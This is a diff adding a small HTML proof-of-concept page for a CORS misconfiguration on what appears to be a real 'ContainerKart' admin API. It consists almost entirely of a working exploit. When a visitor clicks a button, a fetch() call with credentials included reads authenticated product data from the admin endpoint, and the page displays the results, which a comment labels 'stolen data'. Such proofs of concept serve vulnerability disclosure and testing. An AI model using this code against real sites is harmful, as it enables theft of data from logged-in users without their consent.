@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS PoC</title></head>
+<body>
+<h2>CORS PoC - ContainerKart Admin</h2>
+<button onclick="exploit()">Run PoC</button>
+<pre id="output">Output will appear here...</pre>
+
+<script>
+function exploit() {
+  document.getElementById("output").innerText = "Sending request...";
+  
+  fetch("https://containerkart-admin.clicklogic.tech/api/v1/ckproducts/products/filter?page=1&per_page=15", {
+    method: "GET",
+    credentials: "include"
+  })
+  .then(r => r.json())
+  .then(data => {
+    // Display stolen data on page (for PoC demonstration)
+    document.getElementById("output").innerText = JSON.stringify(data, null, 2);
+    console.log("Stolen data:", data);
+  })
+  .catch(err => {
+    document.getElementById("output").innerText = "Error: " + err;
+  });
+}
+</script>
+</body>
+</html>
